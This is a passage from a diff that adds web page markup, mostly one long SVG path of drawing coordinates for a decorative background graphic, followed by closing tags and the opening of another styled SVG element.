208.514C993.773 206.382 994.336 204.502 995.192 203.393C994.193 202.347 993.515 200.311 993.515 197.971C993.515 195.839 994.078 193.959 994.935 192.851C993.935 191.804 993.257 189.768 993.257 187.429C993.257 185.296 993.82 183.416 994.677 182.307C993.678 181.261 993 179.225 993 176.886C993 174.753 993.563 172.872 994.42 171.764C993.421 170.717 992.743 168.682 992.743 166.343C992.743 164.211 993.307 162.331 994.163 161.223C993.163 160.176 992.484 158.14 992.484 155.8C992.484 153.667 993.048 151.786 993.905 150.678C992.906 149.631 992.229 147.596 992.229 145.257C992.229 143.124 992.792 141.244 993.649 140.135C992.769 139.213 992.138 137.523 992 135.533C983.747 145.553 972.815 154.155 959.891 160.759C944.781 168.479 927.415 173.231 909.331 174.593C891.247 175.955 873.002 173.886 856.214 168.568C839.425 163.25 824.61 154.848 813.082 144.106C801.554 133.364 793.668 120.614 790.123 106.985C788.96 102.514 788.276 97.9933 788.068 93.4676C747.88 110.546 722 134 722 134V155H704.5V140H687V155H669.5V140H652V155H634L614.5 122.5C614.5 122.5 589.671 94.7505 545.547 76.647C545.619 77.1603 545.657 77.7001 545.657 78.2571C545.657 80.39 545.093 82.2702 544.237 83.3787C545.236 84.4254 545.914 86.4607 545.914 88.8C545.914 90.9322 545.351 92.8118 544.494 93.9205C545.494 94.9668 546.172 97.0027 546.172 99.3428C546.172 101.476 545.609 103.356 544.752 104.465C545.751 105.511 546.429 107.547 546.429 109.886C546.429 112.019 545.865 113.899 545.008 115.007C546.007 116.054 546.685 118.089 546.685 120.429C546.685 122.561 546.122 124.441 545.265 125.549C546.265 126.596 546.943 128.632 546.943 130.971C546.943 133.104 546.38 134.984 545.523 136.093C546.486 137.101 547.151 139.027 547.198 141.259L547.2 141.257L547.199 141.293C547.2 141.366 547.201 141.44 547.201 141.514C547.201 141.808 547.19 142.098 547.169 142.381C547.15 143.281 547.139 144.44 547.2 144.729C547.33 145.347 547.633 146.026 547.977 146.657H548.034L558 156.97C557.536 157.666 557.189 157.897 556.494 158.361C556.207 158.552 555.951 158.68 555.708 158.801C555.259 159.025 554.859 159.225 554.408 159.752L552.438 177.597C552.438 177.597 553.134 178.56 553.365 179.104C553.584 179.619 553.606 179.801 553.597 180.262C553.588 180.662 552.883 180.922 552.031 181.235C551.157 181.556 550.128 181.934 549.541 182.58C548.125 184.138 546.988 186.269 547.223 187.447C547.339 188.026 546.876 190.46 545.021 190.46C543.283 190.46 542.356 188.953 542.356 187.447C542.356 187.215 539.691 182.58 539.691 182.58C539.691 182.58 538.499 181.928 537.721 181.537C537.412 181.382 537.098 181.312 536.802 181.245C536.281 181.129 535.813 181.024 535.519 180.494C534.944 179.455 536.215 178.408 536.215 178.408C536.215 178.408 536.344 177.28 536.33 176.554C536.215 170.181 534.361 159.983 534.361 159.983C534.361 159.983 534.238 159.491 534.013 159.288C533.762 159.061 533.395 159.03 533.061 159.001L533.061 159.001C532.902 158.987 532.75 158.974 532.622 158.94C531.796 158.725 531 157.782 531 157.782C531 157.782 537.501 151.028 539.616 148.77C539.859 148.384 540.391 147.508 540.728 146.682L540.734 146.657H540.738C540.909 146.232 541.028 145.821 541.028 145.5V143.931C540.864 143.189 540.773 142.372 540.773 141.514C540.773 139.382 541.336 137.502 542.192 136.393C541.193 135.347 540.515 133.311 540.515 130.971C540.515 128.839 541.078 126.959 541.935 125.851C540.935 124.804 540.257 122.768 540.257 120.429C540.257 118.296 540.82 116.416 541.677 115.307C540.678 114.261 540 112.225 540 109.886C540 107.753 540.563 105.872 541.42 104.764C540.421 103.717 539.743 101.682 539.743 99.3429C539.743 97.2108 540.307 95.3312 541.163 94.2226C540.163 93.1763 539.484 91.1403 539.484 88.8C539.484 86.6667 540.048 84.7862 540.905 83.6778C539.906 82.6309 539.229 80.596 539.229 78.2571C539.229 76.8128 539.487 75.4844 539.92 74.433C517.969 66.1604 491.625 60.4704 461.5 61.5C359.5 64.986 322.5 122.5 322.5 122.5H299.875H277.25H254.625H243.312C243.312 122.5 238.408 125.056 235.5 128C231.504 132.047 230.5 140.75 230.5 140.75L227.5 155C227.5 155 229.566 160.103 232 162.5C234.554 165.015 240 167 240 167L214.5 202.5L190.5 167C190.5 167 198.681 166.355 202 164.5C205.319 162.645 207.5 157.5 207.5 157.5L210.5 143.5V81.3928C193.545 86.3245 173.819 89 153.5 89C139.427 89 125.639 87.7166 112.858 85.289C113.161 86.3982 113.333 87.6606 113.333 89C113.333 91.7643 112.603 94.2012 111.492 95.6382C112.788 96.9948 113.667 99.6336 113.667 102.667C113.667 105.432 112.936 107.869 111.826 109.306C113.121 110.663 113.999 113.301 113.999 116.333C113.999 119.098 113.269 121.535 112.158 122.972C113.454 124.328 114.333 126.967 114.333 130C114.333 132.764 113.603 135.201 112.492 136.638C113.788 137.995 114.667 140.634 114.667 143.667C114.667 146.431 113.937 148.869 112.826 150.306C114.121 151.662 115 154.301 115 157.333C115 160.099 114.269 162.536 113.159 163.973C114.453 165.33 115.332 167.968 115.332 171C115.332 173.764 114.602 176.201 113.492 177.638C114.787 178.994 115.667 181.633 115.667 184.667C115.667 187.431 114.936 189.868 113.826 191.305C115.074 192.613 115.935 195.11 115.997 198.003L116 198L115.998 198.067L115.999 198.157C116 198.2 116 198.243 116 198.286L116 198.333C116 198.708 115.987 199.076 115.961 199.436C115.936 200.606 115.921 202.124 116 202.5C116.169 203.301 116.561 204.182 117.008 205H117.082L130 218.369C129.399 219.27 128.949 219.571 128.047 220.172C127.676 220.419 127.343 220.585 127.028 220.743C126.447 221.033 125.928 221.292 125.343 221.974L122.79 245.107C122.79 245.107 123.692 246.356 123.991 247.06C124.275 247.728 124.305 247.964 124.292 248.562C124.281 249.081 123.367 249.417 122.263 249.823L122.263 249.823C121.129 250.239 119.795 250.729 119.034 251.567C117.199 253.586 115.725 256.349 116.03 257.876C116.18 258.627 115.579 261.781 113.176 261.781C110.923 261.781 109.721 259.828 109.721 257.876C109.721 257.575 106.266 251.567 106.266 251.567C106.266 251.567 104.721 250.721 103.712 250.215C103.312 250.014 102.905 249.923 102.521 249.836L102.52 249.836C101.845 249.685 101.239 249.55 100.858 248.863C100.112 247.516 101.76 246.159 101.76 246.159C101.76 246.159 101.927 244.696 101.91 243.755C101.76 235.494 99.3562 222.275 99.3562 222.275C99.3562 222.275 99.1977 221.637 98.9056 221.373C98.5799 221.08 98.1047 221.038 97.6721 221.001H97.6719C97.4656 220.983 97.269 220.966 97.103 220.923C96.0319 220.644 95 219.421 95 219.421C95 219.421 103.429 210.665 106.169 207.738C106.485 207.238 107.173 206.103 107.61 205.033L107.618 205H107.623C107.846 204.449 108 203.916 108 203.5V201.471C107.786 200.508 107.667 199.447 107.667 198.333C107.667 195.569 108.398 193.132 109.508 191.695C108.213 190.338 107.334 187.699 107.334 184.667C107.334 181.902 108.064 179.466 109.174 178.029C107.878 176.672 106.999 174.033 106.999 171C106.999 168.235 107.73 165.798 108.84 164.361C107.545 163.004 106.666 160.366 106.666 157.333C106.666 154.568 107.397 152.131 108.508 150.694C107.212 149.337 106.334 146.699 106.334 143.667C106.334 140.902 107.064 138.466 108.174 137.029C106.878 135.672 105.999 133.033 105.999 130C105.999 127.235 106.73 124.798 107.84 123.361C106.545 122.004 105.666 119.366 105.666 116.333C105.666 113.568 106.397 111.131 107.508 109.694C106.213 108.337 105.334 105.699 105.334 102.667C105.334 99.9023 106.064 97.4655 107.175 96.0284C105.879 94.6719 105 92.0331 105 89C105 87.038 105.368 85.241 105.978 83.8493C95.5247 81.4532 85.8824 78.2606 77.486 74.3553C68.9213 70.3718 61.9511 65.7852 56.7663 60.8102C56.748 60.8547 56.7306 60.8972 56.7143 60.9376L56.6873 61.0047L56.6685 61.0519L56.6362 61.1341L56.6113 61.1982L56.6011 61.2247C56.5321 61.405 56.5 61.5 56.5 61.5C56.5 61.5 47.9139 94.6846 51 129.5C52.4606 145.977 56.5 171.5 56.5 171.5C42.6274 180.241 36.8749 187.986 29.5 206C29.5 206 18.7702 206.759 12.5 204.5C7.04733 202.536 0 196.5 0 196.5V0H2502ZM1884.85 127.65C1884.85 128.232 1884.93 129.252 1885.39 129.691C1885.96 130.23 1886.55 130.508 1887.33 130.395C1887.94 130.306 1888.16 130.156 1888.56 129.691C1889.11 129.058 1889.21 128.044 1889.09 127.224C1888.99 126.578 1888.56 125.814 1888.56 125.814C1888.56 125.814 1888.17 125.566 1887.67 125.408C1886.72 126.154 1885.78 126.901 1884.85 127.65ZM542.343 75.3633C542.208 75.3905 542.076 75.4374 541.952 75.5039L541.816 75.577C541.305 75.8514 540.965 76.3637 540.91 76.9416L540.804 78.0704C540.783 78.2962 540.788 78.5237 540.82 78.7482L540.949 79.6645C541.045 80.3462 541.564 80.8916 542.24 81.0218L542.271 81.0278C542.47 81.066 542.674 81.0626 542.871 81.0178C543.44 80.8882 543.877 80.4313 543.981 79.8567L544.249 78.382C544.33 77.9374 544.307 77.4802 544.183 77.0456L543.99 76.3658C543.945 76.2086 543.874 76.0622 543.781 75.932C543.304 75.7413 542.824 75.5517 542.343 75.3633ZM1948.61 91.4801C1956.69 98.5089 1967.25 105.56 1979.83 112.25C2003.04 124.59 2031.62 134.898 2060.47 141.343C2089.33 147.787 2116.6 149.949 2137.44 147.445C2149.98 145.938 2159.7 142.798 2166.1 138.298C2141.38 109.622 2103.13 80.5054 2048.5 77.5C2009.39 75.3481 1976.26 81.3359 1948.61 91.4801ZM1665.41 70.5974C1719.14 81.9922 1759.82 109.237 1787.63 134.56C1783.04 135.84 1778.22 136.915 1773.23 137.768C1759.09 140.186 1744.03 140.75 1729.38 139.412C1714.72 138.074 1700.93 134.874 1689.21 130.096C1677.5 125.318 1668.23 119.109 1662.23 112.019C1656.22 104.93 1653.67 97.1781 1654.79 89.4511C1655.75 82.8353 1659.37 76.4124 1665.41 70.5974ZM798.058 89.478C797.965 94.8311 798.603 100.196 799.979 105.486C803.202 117.876 810.371 129.466 820.85 139.231C831.33 148.996 844.797 156.634 860.059 161.468C875.321 166.302 891.906 168.184 908.346 166.945C924.786 165.707 940.572 161.388 954.307 154.37C968.043 147.351 979.303 137.851 987.09 126.711C988.251 125.049 989.33 123.358 990.325 121.642C967.482 104.61 921.324 76 869 76C843.034 76 818.927 81.6766 798.058 89.478ZM1289.78 85.5822C1295.08 82.0371 1299.52 77.3552 1302.77 71.8859L1303 65.5C1303 65.5 1293 29 1244.5 29C1238.39 29 1232.86 29.5792 1227.86 30.5917C1226.72 32.8254 1225.78 35.1624 1225.05 37.5775C1223.01 44.312 1222.65 51.4464 1224.03 58.3488C1225.4 65.2512 1228.45 71.7084 1232.92 77.1485C1237.38 82.5886 1243.12 86.8437 1249.62 89.5369C1256.13 92.23 1263.19 93.2781 1270.19 92.5883C1277.2 91.8985 1283.92 89.4921 1289.78 85.5822ZM60.1803 54.5469C67.272 43.8303 86.325 24.5 131.5 24.5C190.5 24.5 210.5 61.5 210.5 61.5V76.7202C193.92 82.1401 174.039 85.1049 153.5 85.1049C127.21 85.1049 101.997 80.2474 83.4077 71.6011C72.9519 66.7379 65.0732 60.9002 60.1803 54.5469ZM109 86C108.332 86.0538 108.019 86.2031 107.667 86.6667C107.455 86.9458 107.167 87.8333 107.167 87.8333C107.167 87.8333 107.036 89.5695 107.667 90.1666C108.206 90.6769 108.766 90.9404 109.5 90.8333C110.076 90.7493 110.285 90.6067 110.666 90.1666C111.185 89.568 111.279 88.609 111.166 87.8333C111.078 87.2222 110.666 86.5 110.666 86.5C110.666 86.5 109.784 85.9368 109 86ZM109.02 112.859C108.357 113.215 107.916 113.879 107.846 114.628L107.709 116.091C107.681 116.384 107.688 116.679 107.729 116.97L107.896 118.158C108.021 119.041 108.693 119.748 109.57 119.917L109.611 119.925C109.868 119.974 110.132 119.97 110.387 119.912C111.125 119.744 111.692 119.152 111.827 118.407L112.174 116.495C112.279 115.919 112.25 115.326 112.089 114.763L111.838 113.882C111.69 113.363 111.321 112.935 110.83 112.711C110.307 112.473 109.703 112.493 109.197 112.764L109.02 112.859ZM113.189 156.214C113.176 156.334 113.153 156.453 113.121 156.57L112.962 157.138C112.744 157.923 112.084 158.506 111.279 158.625C111.093 158.653 110.905 158.655 110.719 158.631L110.692 158.628C109.74 158.509 108.968 157.801 108.765 156.864L108.755 156.815L108.75 156.792C108.747 156.777 108.744 156.762 108.741 156.747L108.846 155.628C108.863 155.451 108.9 155.28 108.956 155.115C109.218 154.561 109.693 154.123 110.29 153.915L110.351 153.893C110.772 153.746 111.229 153.735 111.657 153.862C112.086 153.989 112.459 154.247 112.729 154.594C112.773 154.686 112.809 154.782 112.838 154.882L113.089 155.763C113.132 155.911 113.165 156.062 113.189 156.214ZM111.998 104.333C112.022 106 110.638 106.833 109.165 106.833C109.092 106.824 109.02 106.816 108.951 106.807C107.76 106.666 107.165 106.595 107.165 104.333C107.165 101.94 107.665 100.833 109.332 100.833C110.146 100.833 110.556 101.369 111.038 102.001L111.106 102.09L111.165 102.167C111.719 102.884 111.985 103.427 111.998 104.333ZM112.957 144.811C112.722 146.493 111.526 147.333 110.263 147.333C110.194 147.322 110.127 147.311 110.062 147.301L110.06 147.301L110.057 147.3C108.907 147.119 108.332 147.029 108.332 144.139C108.332 143.887 108.335 143.647 108.342 143.418C108.607 142.343 109.201 141.833 110.332 141.833C111.146 141.833 111.556 142.369 112.038 143.001L112.111 143.097L112.165 143.167C112.604 143.735 112.862 144.194 112.957 144.811ZM110 127C109.332 127.054 109.019 127.203 108.667 127.667C108.455 127.946 108.167 128.833 108.167 128.833C108.167 128.833 108.036 130.569 108.667 131.167C109.206 131.677 109.766 131.94 110.5 131.833C111.076 131.749 111.285 131.607 111.666 131.167C112.185 130.568 112.279 129.609 112.166 128.833C112.078 128.222 111.666 127.5 111.666 127.5C111.666 127.5 110.784 126.937 110 127ZM109.256 168.588C109.661 167.952 110.022 167.747 110.791 167.673C111.693 167.587 112.71 168.359 112.71 168.359C112.71 168.359 113.184 169.349 113.285 170.187C113.415 171.251 113.306 172.566 112.71 173.387C112.271 173.99 112.03 174.186 111.367 174.301C110.521 174.448 109.876 174.087 109.256 173.387C108.53 172.568 108.68 170.187 108.68 170.187C108.68 170.187 109.012 168.97 109.256 168.588ZM111.29 194.915C110.471 195.201 109.88 195.919 109.756 196.778L109.726 196.99C109.686 197.264 109.696 197.543 109.755 197.815L109.765 197.864C109.968 198.801 110.74 199.509 111.692 199.628L111.719 199.631C111.905 199.655 112.093 199.653 112.279 199.625C113.084 199.506 113.744 198.923 113.962 198.138L114.121 197.57C114.258 197.078 114.221 196.554 114.016 196.087L113.999 196.047C113.748 195.474 113.257 195.04 112.657 194.862C112.229 194.735 111.772 194.746 111.351 194.893L111.29 194.915ZM111.263 188.333C112.685 188.333 114.021 187.269 113.998 185.139C113.986 183.981 113.729 183.287 113.194 182.37C113.152 182.299 113.111 182.228 113.071 182.158C112.606 181.352 112.21 180.667 111.424 180.667C109.815 180.667 109.332 182.081 109.332 185.139C109.332 188.029 109.907 188.119 111.057 188.3L111.06 188.301C111.125 188.311 111.193 188.322 111.263 188.333ZM115.579 221.223H109.57L109.843 244.957H115.442L115.579 221.223ZM102.735 221.929C102.706 221.623 102.953 221.362 103.26 221.374L103.711 221.352C104.114 221.283 104.49 221.575 104.524 221.983L106.386 244.76C106.404 244.977 106.312 245.188 106.141 245.323C106.026 245.413 105.885 245.462 105.739 245.462H105.674C105.243 245.462 104.882 245.133 104.842 244.703L102.735 221.929ZM120.899 221.068C120.676 221.163 120.524 221.375 120.506 221.617L118.764 244.693C118.745 244.944 118.88 245.181 119.104 245.293C119.251 245.366 119.421 245.379 119.577 245.327L119.684 245.291C120.019 245.179 120.256 244.88 120.289 244.529L122.411 221.757C122.452 221.312 122.102 220.927 121.655 220.927C121.632 220.927 121.61 220.928 121.587 220.93C121.58 220.931 121.572 220.932 121.564 220.933C121.56 220.933 121.556 220.934 121.552 220.934C121.542 220.936 121.531 220.937 121.52 220.939L121.039 221.026C120.991 221.034 120.944 221.048 120.899 221.068ZM544.979 109.297C545.004 109.205 545.022 109.113 545.032 109.019C545.013 108.903 544.988 108.788 544.955 108.674L544.761 107.994C544.74 107.918 544.712 107.845 544.678 107.775C544.47 107.506 544.182 107.306 543.85 107.208C543.52 107.11 543.167 107.118 542.842 107.232L542.795 107.249C542.337 107.409 541.971 107.744 541.768 108.169C541.724 108.297 541.695 108.432 541.682 108.57L541.601 109.436C541.604 109.453 541.607 109.469 541.611 109.485L541.619 109.523C541.775 110.247 542.371 110.792 543.105 110.884L543.126 110.887C543.269 110.905 543.415 110.903 543.558 110.882C544.179 110.79 544.688 110.341 544.857 109.735L544.979 109.297ZM542.775 102.171C543.75 102.171 544.672 101.523 544.853 100.225C544.78 99.7493 544.581 99.3954 544.242 98.957L544.196 98.8977L544.144 98.829C543.772 98.342 543.456 97.9285 542.828 97.9285C541.955 97.9285 541.497 98.3217 541.293 99.1514C541.288 99.3281 541.285 99.5134 541.285 99.7071C541.285 101.937 541.729 102.006 542.616 102.146L542.724 102.163L542.775 102.171ZM541.543 87C541.815 86.6424 542.056 86.5272 542.572 86.4857C543.176 86.4369 543.857 86.8714 543.857 86.8714C543.857 86.8714 544.175 87.4285 544.243 87.8999C544.329 88.4983 544.257 89.2382 543.857 89.6999C543.563 90.0394 543.402 90.1494 542.957 90.2142C542.391 90.2968 541.959 90.0936 541.543 89.6999C541.057 89.2393 541.157 87.8999 541.157 87.8999C541.157 87.8999 541.38 87.2153 541.543 87ZM543.182 117.862C542.589 117.919 542.31 118.077 541.998 118.568C541.809 118.863 541.554 119.802 541.554 119.802C541.554 119.802 541.438 121.638 541.998 122.27C542.476 122.81 542.974 123.088 543.626 122.975C544.137 122.886 544.323 122.735 544.662 122.27C545.122 121.637 545.206 120.622 545.106 119.802C545.027 119.155 544.662 118.391 544.662 118.391C544.662 118.391 543.878 117.795 543.182 117.862ZM542.384 140.314C542.479 139.652 542.935 139.098 543.567 138.877L543.614 138.861C543.939 138.747 544.291 138.738 544.621 138.836C545.084 138.974 545.463 139.308 545.656 139.75L545.67 139.781C545.828 140.142 545.856 140.546 545.75 140.925L545.628 141.364C545.46 141.969 544.951 142.419 544.329 142.511C544.186 142.532 544.041 142.534 543.898 142.516L543.877 142.513C543.143 142.421 542.547 141.875 542.39 141.152L542.382 141.114C542.337 140.905 542.33 140.689 542.36 140.478L542.384 140.314ZM545.656 131.336C545.674 132.979 544.643 133.8 543.546 133.8C543.492 133.791 543.438 133.783 543.387 133.774C542.5 133.635 542.057 133.565 542.057 131.336C542.057 128.977 542.429 127.886 543.67 127.886C544.277 127.886 544.582 128.414 544.941 129.037L544.942 129.038L544.986 129.115L545.036 129.2C545.448 129.907 545.647 130.442 545.656 131.336ZM542.24 159.172H546.875L546.769 177.481H542.45L542.24 159.172ZM537.372 159.288C537.136 159.28 536.945 159.481 536.967 159.717L538.593 177.285C538.624 177.617 538.902 177.871 539.235 177.871H539.285C539.397 177.871 539.506 177.833 539.594 177.764C539.726 177.66 539.798 177.497 539.784 177.329L538.347 159.758C538.322 159.443 538.031 159.218 537.72 159.272L537.372 159.288ZM550.676 159.476C550.69 159.289 550.807 159.126 550.979 159.052C551.014 159.037 551.05 159.026 551.087 159.02L551.458 158.953C551.492 158.947 551.527 158.944 551.562 158.944C551.907 158.944 552.177 159.241 552.145 159.584L550.508 177.151C550.483 177.422 550.3 177.653 550.041 177.739L549.959 177.766C549.839 177.806 549.708 177.797 549.595 177.74C549.421 177.654 549.317 177.471 549.332 177.277L550.676 159.476ZM994.816 142.577C994.305 142.851 993.965 143.364 993.91 143.942L993.804 145.07C993.783 145.296 993.788 145.524 993.82 145.748L993.949 146.665C994.045 147.346 994.564 147.892 995.24 148.022L995.271 148.028C995.47 148.066 995.674 148.063 995.871 148.018C996.44 147.888 996.877 147.431 996.981 146.857L997.249 145.382C997.33 144.937 997.307 144.48 997.183 144.046L996.99 143.366C996.875 142.965 996.591 142.635 996.212 142.463C995.809 142.279 995.343 142.294 994.952 142.504L994.816 142.577ZM998.032 176.02C998.022 176.113 998.004 176.205 997.979 176.297L997.857 176.735C997.688 177.341 997.179 177.79 996.558 177.882C996.415 177.903 996.269 177.905 996.126 177.887L996.105 177.884C995.371 177.792 994.775 177.247 994.619 176.523L994.611 176.485L994.604 176.455L994.601 176.436L994.682 175.57C994.687 175.519 994.694 175.469 994.703 175.419C994.719 175.334 994.741 175.25 994.768 175.169C994.971 174.744 995.337 174.409 995.795 174.249L995.842 174.232C996.167 174.118 996.52 174.11 996.85 174.208C997.182 174.306 997.47 174.506 997.678 174.775C997.712 174.845 997.74 174.918 997.761 174.994L997.955 175.674C997.962 175.699 997.969 175.724 997.975 175.749C997.998 175.838 998.017 175.929 998.032 176.02ZM997.113 136C997.131 137.286 996.063 137.929 994.927 137.929C994.874 137.922 994.822 137.916 994.771 137.91L994.765 137.909L994.763 137.909L994.762 137.909C993.844 137.799 993.384 137.745 993.384 136C993.384 134.154 993.77 133.3 995.056 133.3C995.684 133.3 996 133.713 996.372 134.201L996.372 134.201L996.417 134.26L996.47 134.329C996.898 134.882 997.103 135.301 997.113 136ZM997.853 167.225C997.672 168.523 996.75 169.171 995.775 169.171C995.722 169.163 995.67 169.154 995.619 169.147L995.616 169.146C994.729 169.006 994.285 168.937 994.285 166.707C994.285 166.513 994.288 166.328 994.293 166.151C994.497 165.322 994.955 164.928 995.828 164.928C996.456 164.928 996.772 165.342 997.144 165.829L997.169 165.862L997.206 165.91L997.242 165.957C997.581 166.395 997.78 166.749 997.853 167.225ZM995.572 153.486C995.056 153.527 994.815 153.642 994.543 154C994.38 154.215 994.157 154.9 994.157 154.9C994.157 154.9 994.057 156.239 994.543 156.7C994.959 157.094 995.391 157.297 995.957 157.214C996.402 157.149 996.563 157.039 996.857 156.7C997.257 156.238 997.329 155.498 997.243 154.9C997.175 154.428 996.857 153.871 996.857 153.871C996.857 153.871 996.176 153.437 995.572 153.486ZM994.998 185.568C995.31 185.077 995.589 184.919 996.182 184.862C996.878 184.795 997.662 185.391 997.662 185.391C997.662 185.391 998.027 186.155 998.106 186.802C998.206 187.622 998.122 188.637 997.662 189.27C997.323 189.735 997.137 189.886 996.626 189.975C995.974 190.088 995.476 189.81 994.998 189.27C994.438 188.638 994.554 186.802 994.554 186.802C994.554 186.802 994.809 185.863 994.998 185.568ZM996.567 205.877C995.935 206.098 995.479 206.652 995.384 207.314L995.36 207.478C995.33 207.689 995.337 207.905 995.382 208.114L995.39 208.152C995.547 208.875 996.143 209.421 996.877 209.513L996.898 209.516C997.041 209.534 997.186 209.532 997.329 209.511C997.951 209.419 998.46 208.969 998.628 208.364L998.75 207.925C998.856 207.546 998.828 207.142 998.67 206.781L998.656 206.75C998.463 206.308 998.084 205.974 997.621 205.836C997.291 205.738 996.939 205.747 996.614 205.861L996.567 205.877ZM996.546 200.8C997.643 200.8 998.674 199.979 998.656 198.336C998.647 197.442 998.448 196.907 998.036 196.2C998.004 196.146 997.973 196.092 997.942 196.038L997.941 196.037C997.582 195.414 997.277 194.886 996.67 194.886C995.429 194.886 995.057 195.977 995.057 198.336C995.057 200.565 995.5 200.635 996.387 200.774C996.438 200.783 996.492 200.791 996.546 200.8ZM999.875 226.172H995.24L995.45 244.481H999.769L999.875 226.172ZM989.967 226.717C989.945 226.481 990.136 226.28 990.372 226.288L990.72 226.272C991.031 226.218 991.322 226.443 991.347 226.758L992.784 244.329C992.798 244.497 992.726 244.66 992.594 244.764C992.506 244.833 992.397 244.871 992.285 244.871H992.235C991.902 244.871 991.624 244.617 991.593 244.285L989.967 226.717ZM1003.98 226.052C1003.81 226.126 1003.69 226.289 1003.68 226.476L1002.33 244.277C1002.32 244.471 1002.42 244.654 1002.59 244.74C1002.71 244.797 1002.84 244.806 1002.96 244.766L1003.04 244.739C1003.3 244.653 1003.48 244.422 1003.51 244.151L1005.15 226.584C1005.18 226.241 1004.91 225.944 1004.56 225.944C1004.53 225.944 1004.49 225.947 1004.46 225.953L1004.09 226.02C1004.05 226.026 1004.01 226.037 1003.98 226.052ZM1885.58 155.55C1885.65 154.758 1886.12 154.056 1886.82 153.68L1887.01 153.579C1887.54 153.292 1888.18 153.272 1888.73 153.523C1889.25 153.76 1889.64 154.212 1889.8 154.761L1890.06 155.692C1890.23 156.288 1890.27 156.914 1890.15 157.523L1889.79 159.544C1889.64 160.332 1889.05 160.958 1888.27 161.135C1888 161.197 1887.72 161.202 1887.44 161.149L1887.4 161.141C1886.47 160.962 1885.76 160.215 1885.63 159.281L1885.46 158.025C1885.41 157.718 1885.4 157.406 1885.43 157.097L1885.58 155.55ZM1891.15 199.888C1891.19 199.757 1891.21 199.623 1891.23 199.489C1891.2 199.336 1891.17 199.184 1891.13 199.035L1890.86 198.103C1890.83 198.006 1890.8 197.911 1890.75 197.82C1890.47 197.443 1890.07 197.163 1889.61 197.025C1889.15 196.891 1888.67 196.903 1888.23 197.059L1888.16 197.081C1887.55 197.296 1887.05 197.74 1886.77 198.304C1886.7 198.492 1886.66 198.689 1886.64 198.892L1886.53 200.097L1886.54 200.147L1886.55 200.199C1886.76 201.19 1887.58 201.938 1888.59 202.064L1888.61 202.067C1888.81 202.092 1889.01 202.09 1889.21 202.061C1890.06 201.934 1890.75 201.319 1890.99 200.489L1891.15 199.888ZM1886.97 147.31C1888.53 147.31 1889.99 146.429 1889.97 144.667C1889.95 143.708 1889.67 143.134 1889.09 142.376C1889.05 142.325 1889.01 142.274 1888.97 142.224L1888.95 142.201C1888.44 141.533 1888.01 140.967 1887.15 140.967C1885.39 140.967 1884.86 142.137 1884.86 144.667C1884.86 147.058 1885.49 147.132 1886.74 147.282L1886.89 147.3L1886.97 147.31ZM1888.13 190.124C1889.47 190.124 1890.74 189.233 1890.98 187.452C1890.88 186.802 1890.61 186.318 1890.15 185.719L1890.13 185.694L1890.01 185.544C1889.5 184.876 1889.07 184.309 1888.21 184.309C1887.01 184.309 1886.38 184.85 1886.1 185.992C1886.1 186.232 1886.09 186.484 1886.09 186.747C1886.09 189.802 1886.7 189.898 1887.91 190.089C1887.99 190.1 1888.06 190.111 1888.13 190.124ZM1886.45 169.333C1886.82 168.843 1887.15 168.685 1887.86 168.628C1888.69 168.562 1889.62 169.157 1889.62 169.157C1889.62 169.157 1890.05 169.921 1890.15 170.567C1890.27 171.387 1890.17 172.4 1889.62 173.033C1889.22 173.498 1888.99 173.649 1888.39 173.738C1887.61 173.851 1887.02 173.573 1886.45 173.033C1885.78 172.402 1885.92 170.567 1885.92 170.567C1885.92 170.567 1886.22 169.628 1886.45 169.333ZM1888.7 211.626C1887.88 211.704 1887.5 211.921 1887.07 212.593C1886.82 212.997 1886.46 214.284 1886.46 214.284C1886.46 214.284 1886.31 216.8 1887.07 217.666C1887.73 218.406 1888.41 218.788 1889.3 218.632C1890.01 218.511 1890.26 218.304 1890.72 217.666C1891.36 216.798 1891.47 215.408 1891.33 214.284C1891.23 213.398 1890.72 212.351 1890.72 212.351C1890.72 212.351 1889.65 211.535 1888.7 211.626ZM1887.6 242.394C1887.73 241.486 1888.35 240.727 1889.22 240.424L1889.28 240.402C1889.73 240.246 1890.21 240.234 1890.66 240.368C1891.3 240.557 1891.82 241.015 1892.08 241.621L1892.1 241.663C1892.32 242.157 1892.36 242.711 1892.21 243.231L1892.04 243.832C1891.81 244.662 1891.12 245.277 1890.26 245.404C1890.07 245.433 1889.87 245.435 1889.67 245.41L1889.64 245.407C1888.64 245.28 1887.82 244.533 1887.61 243.542L1887.6 243.49C1887.53 243.203 1887.52 242.908 1887.57 242.618L1887.6 242.394ZM1892.08 230.09C1892.11 232.341 1890.69 233.467 1889.19 233.467C1889.12 233.454 1889.04 233.443 1888.97 233.432L1888.97 233.432C1887.76 233.24 1887.15 233.145 1887.15 230.09C1887.15 226.857 1887.66 225.362 1889.36 225.362M1892.08 230.09C1892.07 228.865 1891.8 228.132 1891.23 227.163ZM1891.23 227.163C1891.19 227.088 1891.14 227.013 1891.1 226.939ZM1887.4 268.236H1893.75L1893.61 293.326H1887.69L1887.4 268.236ZM1880.73 268.395C1880.41 268.383 1880.15 268.659 1880.18 268.982L1882.4 293.058C1882.45 293.512 1882.83 293.86 1883.28 293.86H1883.35C1883.51 293.86 1883.66 293.808 1883.78 293.713C1883.96 293.571 1884.06 293.347 1884.04 293.118L1882.07 269.039C1882.03 268.608 1881.64 268.299 1881.21 268.373L1880.73 268.395ZM1898.96 268.652C1898.98 268.397 1899.14 268.173 1899.38 268.072C1899.43 268.051 1899.48 268.036 1899.53 268.027L1900.04 267.936C1900.08 267.927 1900.13 267.923 1900.18 267.923C1900.65 267.923 1901.02 268.33 1900.98 268.801L1898.73 292.873C1898.7 293.245 1898.45 293.561 1898.09 293.679L1897.98 293.717C1897.82 293.772 1897.64 293.759 1897.48 293.681C1897.24 293.562 1897.1 293.312 1897.12 293.047L1898.96 268.652Z"></path>
+            </svg>
+        </div>
+        <svg class="fill-sky-300/5 absolute inset-x-0 bottom-4 scale-125" viewBox="0 0 1920 136" xmlns="http://www.w3.org/2000/svg">
